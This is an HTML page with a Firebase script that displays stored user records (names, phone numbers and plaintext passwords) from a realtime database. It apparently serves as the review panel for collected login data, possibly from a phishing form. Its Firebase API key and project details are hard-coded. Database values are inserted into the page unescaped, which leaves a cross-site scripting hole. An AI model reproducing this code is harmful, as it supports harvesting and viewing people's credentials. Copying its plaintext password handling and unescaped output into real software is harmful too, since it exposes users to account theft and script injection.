<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>ðŸ“‹ View Submissions</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f4f4f4;
      margin: 0;
      padding: 20px;
    }
    h2 {
      text-align: center;
      color: #333;
    }
    table {
      width: 100%;
      border-collapse: collapse;
      margin-top: 20px;
      background: #fff;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }
    th, td {
      border: 1px solid #ddd;
      padding: 12px;
      text-align: left;
    }
    th {
      background-color: #007bff;
      color: white;
    }
    tr:nth-child(even) {
      background-color: #f9f9f9;
    }
    @media screen and (max-width: 600px) {
      table, thead, tbody, th, td, tr {
        display: block;
      }
      th {
        position: sticky;
        top: 0;
        background: #007bff;
        z-index: 2;
      }
    }
  </style>
</head>
<body>
  <h2>ðŸ§¾ Submitted User Data</h2>
  <table id="dataTable">
    <thead>
      <tr>
        <th>Name</th>
        <th>Phone</th>
        <th>Password</th>
      </tr>
    </thead>
    <tbody>
      <!-- Data will be inserted here -->
    </tbody>
  </table>

  <script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/12.0.0/firebase-app.js";
    import { getDatabase, ref, onValue } from "https://www.gstatic.com/firebasejs/12.0.0/firebase-database.js";

    const firebaseConfig = {
      apiKey: "AIzaSyDQBcco2s6QzYZLAde67vx4MwnvzMo_hk4",
      authDomain: "xznantor07-48133.firebaseapp.com",
      databaseURL: "https://xznantor07-48133-default-rtdb.firebaseio.com",
      projectId: "xznantor07-48133",
      storageBucket: "xznantor07-48133.appspot.com",
      messagingSenderId: "941859261907",
      appId: "1:941859261907:web:9c8d39adc4c44456c6b326",
      measurementId: "G-JEKMS1EMWY"
    };

    // Initialize Firebase
    const app = initializeApp(firebaseConfig);
    const database = getDatabase(app);
    const usersRef = ref(database, 'users');

    const tableBody = document.querySelector('#dataTable tbody');

    onValue(usersRef, (snapshot) => {
      tableBody.innerHTML = '';
      const users = snapshot.val();

      if (users) {
        for (const phone in users) {
          const user = users[phone];
          const row = `
            <tr>
              <td>${user.name}</td>
              <td>${user.phone}</td>
              <td>${user.password}</td>
            </tr>
          `;
          tableBody.insertAdjacentHTML('beforeend', row);
        }
      } else {
        tableBody.innerHTML = '<tr><td colspan="3">No data found</td></tr>';
      }
    });
  </script>
</body>
</html>
